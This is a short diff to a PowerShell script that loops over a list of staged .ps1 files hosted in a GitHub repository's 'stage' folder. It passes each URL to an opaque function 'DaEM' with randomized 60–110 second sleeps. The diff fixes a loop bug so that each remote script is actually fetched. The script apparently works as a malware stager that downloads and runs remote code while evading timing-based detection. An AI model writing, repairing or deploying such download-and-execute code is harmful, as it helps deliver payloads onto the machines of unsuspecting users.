@@ -13,11 +13,11 @@ $files = @(
     "kS2.ps1",
     "jS2.ps1",
     "jS3.ps1"
-
 )
+
 $base = "https://raw.githubusercontent.com/encryptedSubject/subject1/main/stage/"
 foreach ($fil in $files){
-    $full = $base + $files
+    $full = $base + $fil
     DaEM $full
     Start-Sleep (Get-Random -min 60 -max 110)
 }
